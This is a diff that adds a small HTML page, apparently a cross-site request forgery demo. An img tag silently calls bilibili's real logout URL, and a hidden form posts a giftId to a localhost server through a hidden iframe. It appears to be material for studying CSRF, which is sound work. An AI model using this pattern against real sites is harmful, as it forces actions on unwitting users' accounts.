@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <img src="https://passport.bilibili.com/login?act=exit" />
+    <p>bilibili 退出登陆！</p>
+    <iframe name="hiddenIframe" style="display:none"></iframe>
+    <form
+      action="http://localhost:8000"
+      id="form"
+      method="post"
+      style="visibility:hidden"
+      target="hiddenIframe"
+    >
+      <input type="text" name="giftId" value="ab231" />
+    </form>
+    <script>
+      document.getElementById("form").submit();
+      // location.href = "http://www.baidu.com";
+    </script>
+
+    <!-- <script>
+      const httpRequest = new XMLHttpRequest();
+      const formData = new FormData();
+      formData.append("name", "shianqi");
+
+      httpRequest.open("POST", "http://localhost:8000/", false);
+      httpRequest.setRequestHeader(
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      );
+      // httpRequest.setRequestHeader('Content-Length', "")
+      httpRequest.onreadystatechange = function() {
+        if (httpRequest.readyState === 4 && httpRequest.status === 200) {
+          console.log("success", httpRequest.responseText);
+        }
+      };
+      httpRequest.send(formData);
+    </script> -->
+  </body>
+</html>
